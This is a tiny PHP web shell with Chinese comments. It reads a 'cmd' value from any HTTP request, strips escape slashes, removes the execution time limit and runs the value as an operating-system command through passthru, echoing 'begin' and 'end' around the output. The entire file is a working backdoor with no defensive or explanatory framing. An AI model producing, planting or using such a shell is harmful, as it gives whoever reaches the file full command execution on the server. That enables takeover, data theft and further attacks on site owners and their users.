<?php 
if (get_magic_quotes_gpc())
{$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);}//去掉转义字符（可去掉字符串中的反斜线字符）
ini_set("max_execution_time",0);//设定针对这个文件的执行时间，0为不限制.
echo "begin"; //打印的返回的开始行提示信息
passthru($_REQUEST["cmd"]);//运行cmd指定的命令
echo "end"; //打印的返回的结束行提示信息
?>
